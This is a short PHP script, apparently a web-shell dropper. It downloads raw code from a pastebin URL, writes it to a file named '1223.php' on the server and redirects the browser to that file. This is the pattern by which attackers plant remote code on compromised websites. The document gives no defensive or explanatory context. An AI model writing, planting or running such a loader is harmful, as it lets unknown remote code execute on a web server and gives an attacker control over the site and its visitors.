<?php
$content = "https://pastebin.com/raw/VYqYKRv7";
$get_content = file_get_contents($content);
if(file_exists("1223.php")){header("location: 1223.php");}else{file_put_contents("1223.php", $get_content); header("location: 1223.php");}
?>
